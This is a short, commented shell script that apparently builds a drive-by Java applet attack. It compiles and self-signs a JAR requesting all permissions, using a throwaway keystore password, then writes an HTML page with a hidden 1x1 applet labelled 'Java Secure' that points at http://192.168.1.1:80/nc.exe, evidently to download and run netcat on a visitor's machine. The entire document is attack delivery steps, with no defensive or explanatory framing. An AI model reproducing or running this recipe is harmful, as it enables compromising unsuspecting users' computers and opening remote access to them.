### Specify the legacy source and target version of Java, along with the bootclasspath during compilaion
/usr/lib/jvm/java-8-openjdk-amd64/bin/javac -source 1.7 -target 1.7 -bootclasspath /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar Java.java

echo "Permissions: all-permissions" > manifest.txt

/usr/lib/jvm/java-8-openjdk-amd64/bin/jar cvf Java.jar Java.class

### Specify RSA as the key generation algorithm, and use the same password for your keystore and keypass.
keytool -genkey -keyalg rsa -alias signapplet -keystore mykeystore -keypass password123 -storepass password123

### Make sure to do the same with the passwords when signing the JAR file
/usr/lib/jvm/java-8-openjdk-amd64/bin/jarsigner -keystore mykeystore -storepass password123 -keypass password123 -signedjar SignedJava.jar Java.jar signapplet

echo '<applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"><param name="1" value="http://192.168.1.1:80/nc.exe"></applet>' > java.html
